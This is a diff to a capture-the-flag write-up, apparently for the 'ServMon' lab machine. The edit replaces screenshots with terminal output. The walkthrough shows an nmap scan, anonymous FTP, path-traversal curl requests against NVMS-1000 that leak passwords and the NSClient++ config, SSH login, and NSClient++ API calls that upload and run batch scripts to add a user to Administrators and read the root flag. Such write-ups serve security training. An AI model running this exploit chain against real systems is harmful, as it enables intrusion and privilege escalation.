@@ -24,19 +24,16 @@ We start with a full port scan using **Nmap**:
 nmap -sC -sV -sT 10.129.227.77
 ```
 
-![nmap scan](/path/to/nmap.png)
-
-Key findings:
-
 ```
-21/tcp   open  ftp          Microsoft FTP Service
-22/tcp   open  ssh          OpenSSH for Windows
-80/tcp   open  http         NVMS-1000
-135/tcp  open  msrpc
-139/tcp  open  netbios-ssn
-445/tcp  open  microsoft-ds
-5666/tcp open  nrpe
-8443/tcp open  https        NSClient++ (monitoring agent)
+PORT      STATE    SERVICE       VERSION
+21/tcp   open     ftp           Microsoft FTP Service
+22/tcp   open     ssh           OpenSSH for Windows
+80/tcp   open     http          NVMS-1000
+135/tcp  open     msrpc
+139/tcp  open     netbios-ssn
+445/tcp  open     microsoft-ds
+5666/tcp open     nrpe
+8443/tcp open     https         NSClient++ (monitoring agent)
 ```
 
 ---
@@ -49,7 +46,14 @@ The FTP server allows anonymous login. Let's connect and explore:
 ftp anonymous@10.129.227.77
 ```
 
-![ftp listing](/path/to/ftp.png)
+```
+230 User logged in.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+-rwxr-xr-x   1 owner    group             153 Feb 27  2022 Confidential.txt
+-rwxr-xr-x   1 owner    group              99 Feb 27  2022 Notes to do.txt
+```
 
 We find two interesting files:
 
@@ -85,10 +89,6 @@ We can read arbitrary files using the `../../../../` path traversal:
 curl "http://10.129.227.77/../../../../../../Users/Nathan/Desktop/Passwords.txt"
 ```
 
-![directory traversal](/path/to/traversal.png)
-
-This reveals Nathan's password list:
-
 ```
 1nsp3ct3r
 Bl4hbl4hbl4h
@@ -105,13 +105,16 @@ We also read the **NSClient++ configuration file** to get the admin password:
 curl "http://10.129.227.77/../../../../../../Program%20Files/NSClient++/nsclient.ini"
 ```
 
-![nsclient config](/path/to/nsclient.png)
-
-Key findings:
-
 ```
+[/settings/default]
 password = ew2x6SsGTxjRwXOT
 allowed hosts = 127.0.0.1
+
+[/modules]
+WEBServer = enabled
+NRPEServer = enabled
+CheckExternalScripts = enabled
+Scheduler = enabled
 ```
 
 So NSClient++ is only accessible from `127.0.0.1` — we'll need an SSH tunnel.
@@ -126,7 +129,16 @@ Using the password list from Nathan's desktop, we find Nadine's credentials:
 sshpass -p "L1k3B1gBut7s@W0rk" ssh Nadine@10.129.227.77
 ```
 
-![user flag](/path/to/userflag.png)
+```
+Microsoft Windows [Version 10.0.18363.752]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+nadine@SERVMON C:\Users\Nadine>whoami
+servername\nadine
+
+nadine@SERVMON C:\Users\Nadine>type Desktop\user.txt
+d1fa48d75838996e2a237ef0ce1b69a5
+```
 
 User flag captured:
 
@@ -163,6 +175,14 @@ curl -sk -u admin:ew2x6SsGTxjRwXOT \
   "https://127.0.0.1:8443/api/v1/modules/"
 ```
 
+```json
+[{"id":"CheckExternalScripts","loaded":true},
+ {"id":"CheckTaskSched","loaded":true},
+ {"id":"NRPEServer","loaded":true},
+ {"id":"Scheduler","loaded":true},
+ {"id":"WEBServer","loaded":true}]
+```
+
 We need **CheckExternalScripts** and **Scheduler** — both are already enabled.
 
 ### Step 3: Create Malicious Script
@@ -176,7 +196,9 @@ curl -sk -u admin:ew2x6SsGTxjRwXOT \
   --data-binary "net localgroup Administrators Nadine /add > C:\temp\pwned.txt"
 ```
 
-![upload script](/path/to/upload.png)
+```
+Added exploit as scripts\exploit.bat
+```
 
 This creates `scripts\exploit.bat` on the server with our command as its content. The `.bat` extension triggers the batch file wrapper, so when executed, Windows CMD processes it.
 
@@ -189,21 +211,38 @@ curl -sk -u admin:ew2x6SsGTxjRwXOT \
   "https://127.0.0.1:8443/api/v1/queries/exploit/commands/execute_nagios?time=1m"
 ```
 
-![execute exploit](/path/to/execute.png)
-
-Response confirms success:
-
-```
-net localgroup Administrators Nadine /add
-System error 1378 has occurred.
-The specified account name is already a member of the group.
+```json
+{"command":"exploit","lines":[{"message":"\r\nC:\\Program Files\\NSClient++>net localgroup Administrators Nadine /add  1>C:\\temp\\pwned.txt \r\nSystem error 1378 has occurred.\r\n\r\nThe specified account name is already a member of the group.","perf":""}],"result":"CRITICAL"}
 ```
 
 Nadine is now in the **Administrators** group!
 
 ### Step 5: Read Root Flag
 
-Create another script to copy and display the root flag:
+Create another script to read the root flag:
+
+```bash
+curl -sk -u admin:ew2x6SsGTxjRwXOT \
+  -X PUT "https://127.0.0.1:8443/api/v1/scripts/ext/scripts/getroot.bat" \
+  --data-binary "copy C:\Users\Administrator\Desktop\root.txt C:\temp\root.txt"
+```
+
+```
+Added getroot as scripts\getroot.bat
+```
+
+Execute it:
+
+```bash
+curl -sk -u admin:ew2x6SsGTxjRwXOT \
+  "https://127.0.0.1:8443/api/v1/queries/getroot/commands/execute_nagios?time=1m"
+```
+
+```json
+{"command":"getroot","lines":[{"message":"\r\nC:\\Program Files\\NSClient++>copy C:\\Users\\Administrator\\Desktop\\root.txt C:\\temp\\root.txt\r\n        1 file(s) copied.","perf":""}],"result":"OK"}
+```
+
+Now read the copied flag:
 
 ```bash
 curl -sk -u admin:ew2x6SsGTxjRwXOT \
@@ -211,17 +250,17 @@ curl -sk -u admin:ew2x6SsGTxjRwXOT \
   --data-binary "type C:\temp\root.txt"
 ```
 
-Execute it:
+```
+Added showflag as scripts\showflag.bat
+```
 
 ```bash
 curl -sk -u admin:ew2x6SsGTxjRwXOT \
   "https://127.0.0.1:8443/api/v1/queries/showflag/commands/execute_nagios?time=1m"
 ```
 
-![root flag](/path/to/rootflag.png)
-
-```
-e15c0c9cf6b61082323e60a7c300ebe8
+```json
+{"command":"showflag","lines":[{"message":"\r\nC:\\Program Files\\NSClient++>type C:\\temp\\root.txt \r\ne15c0c9cf6b61082323e60a7c300ebe8","perf":""}],"result":"OK"}
 ```
 
 ---
